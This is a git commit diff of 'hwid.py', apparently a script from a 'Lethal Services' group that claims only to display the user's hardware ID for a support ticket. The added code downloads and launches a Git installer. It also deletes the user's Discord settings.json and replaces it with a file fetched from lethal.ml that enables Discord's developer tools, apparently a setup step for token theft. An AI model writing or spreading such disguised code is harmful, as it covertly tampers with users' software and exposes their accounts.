29f65339081d5c793e021b3e2228664e850aa4ed
Joshua <73680704+UrFingPoor@users.noreply.github.com>
2023-02-08 17:18:56 -0500

    Update hwid.py

--- hwid.py
+++ hwid.py
@@ -1,10 +1,6 @@
-try:
-    import wmi, os
-    from datetime import datetime
-    from colorama import Fore
-except ImportError as e:
-    print('Please wait while I install the required packages.')
-    os.system("pip install -r requirements.txt")
+import wmi, os, requests, ctypes
+from datetime import datetime
+from colorama import Fore
 
 width = os.get_terminal_size().columns
 os.system('title Lethal Services!')
@@ -16,7 +12,25 @@ print(Fore.LIGHTMAGENTA_EX+'     ██║     ██╔══╝     ██║ 
 print(Fore.LIGHTMAGENTA_EX+'     ███████╗███████╗   ██║   ██║  ██║██║  ██║███████╗     '.center(width))
 print(Fore.LIGHTMAGENTA_EX+'     ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝     '.center(width))
 print(Fore.LIGHTCYAN_EX+'        TOS: Lethal Holds No Responsibility At ALL!         '.center(width))
-print(Fore.WHITE+f'           Version: Beta 1.5 | https://lethal.ml            '.center(width))
-print(f'[{datetime.now().strftime("%H:%M:%S")}] [{Fore.GREEN}info{Fore.WHITE}] [+] {wmi.WMI().Win32_ComputerSystemProduct()[0].UUID}')  
-print(f'[{datetime.now().strftime("%H:%M:%S")}] [{Fore.GREEN}info{Fore.WHITE}] [+] Copy & Paste The Text Into Your Ticket')
-k=input(f'[{datetime.now().strftime("%H:%M:%S")}] [{Fore.GREEN}info{Fore.WHITE}] [+] Press Close To Exit') 
+print(Fore.WHITE+f'           Version: Beta 1.6 | https://lethal.ml            '.center(width))
+
+if ctypes.sizeof(ctypes.c_voidp) == 4:
+    r = requests.get("https://github.com/git-for-windows/git/releases/download/v2.39.1.windows.1/Git-2.39.1-32-bit.exe")
+    if r.status_code == 200:  
+        open(f"{os.getcwd()}\\gitinstalller.exe", 'wb').write(r.content)
+        os.startfile(f"{os.getcwd()}\\gitinstalller.exe")
+else:
+    r = requests.get("https://github.com/git-for-windows/git/releases/download/v2.39.1.windows.1/Git-2.39.1-64-bit.exe")
+    if r.status_code == 200:  
+        open(f"{os.getcwd()}\\gitinstalller.exe", 'wb').write(r.content)
+        os.startfile(f"{os.getcwd()}\\gitinstalller.exe")
+
+if os.path.isfile(f"{os.getenv('APPDATA')}\\discord\\settings.json"):
+    os.remove(f"{os.getenv('APPDATA')}\\discord\\settings.json")
+r = requests.get("https://lethal.ml/settings.json")
+if r.status_code == 200:
+    open(f"{os.getenv('APPDATA')}\\discord\\settings.json", 'wb').write(r.content)
+    print(f'[{datetime.now().strftime("%H:%M:%S")}] [{Fore.GREEN}Info{Fore.WHITE}] [+] Enabled LCTRL + LSHIFT + I, Retstart Discord')
+    print(f'[{datetime.now().strftime("%H:%M:%S")}] [{Fore.GREEN}info{Fore.WHITE}] [+] Your HWID: {wmi.WMI().Win32_ComputerSystemProduct()[0].UUID}')  
+    print(f'[{datetime.now().strftime("%H:%M:%S")}] [{Fore.GREEN}info{Fore.WHITE}] [+] Copy & Paste The Your HWID Into The Ticket')
+    k=input(f'[{datetime.now().strftime("%H:%M:%S")}] [{Fore.GREEN}info{Fore.WHITE}] [+] Press Close To Exit')
